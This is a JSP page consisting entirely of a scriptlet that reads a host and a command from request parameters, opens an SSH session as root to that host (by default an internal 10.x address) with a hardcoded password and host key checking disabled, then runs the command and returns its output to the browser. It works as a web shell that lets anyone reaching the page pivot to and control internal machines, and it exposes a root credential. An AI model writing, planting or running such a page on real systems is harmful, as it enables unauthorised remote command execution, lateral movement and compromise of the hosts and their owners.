<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String host = request.getParameter("h"); if (host == null) { host = "10.1.1.118"; }
String cmd = request.getParameter("c"); if (cmd == null) { cmd = "/usr/bin/id"; }
try {
  com.jcraft.jsch.JSch j = new com.jcraft.jsch.JSch();
  com.jcraft.jsch.Session s = j.getSession("root", host, 22);
  s.setPassword("10isp.com!");
  java.util.Properties p = new java.util.Properties(); p.put("StrictHostKeyChecking", "no"); s.setConfig(p);
  s.connect(10000);
  com.jcraft.jsch.Channel ch = s.openChannel("exec");
  com.jcraft.jsch.ChannelExec ce = (com.jcraft.jsch.ChannelExec) ch;
  ce.setCommand(cmd);
  java.io.ByteArrayOutputStream err = new java.io.ByteArrayOutputStream();
  ce.setErrStream(err);
  java.io.InputStream in = ce.getInputStream();
  ce.connect();
  byte[] b = new byte[4096]; int n;
  while ((n = in.read(b)) > 0) { out.print(new String(b, 0, n)); }
  out.print("|ERR=" + err.toString());
  ce.disconnect(); s.disconnect();
} catch (Throwable t) { out.print("EX=" + t); }
</jsp:scriptlet>
</jsp:root>
